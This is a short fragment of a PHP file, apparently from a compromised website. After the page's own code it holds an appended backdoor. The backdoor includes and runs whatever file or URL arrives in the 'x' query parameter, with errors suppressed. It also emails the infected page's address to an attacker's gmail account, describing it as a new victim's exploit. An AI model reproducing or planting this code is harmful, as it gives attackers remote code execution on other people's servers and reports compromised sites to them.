...
?>
<?
if (trim($_GET['x'])!=''){@include($_GET['x']);exit();}$email = 'ometanix@gmail.com,ometanix@gmail.com,ometanix@gmail.com';$y = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];@mail($email, 'Exploit: '. $_SERVER['PHP_SELF'], 'Hey , this is a new victim\'s exploit: '. $y .'\n\n You can use x ', 'From: '. $email .' <'. $email .'>\r\n');
?>
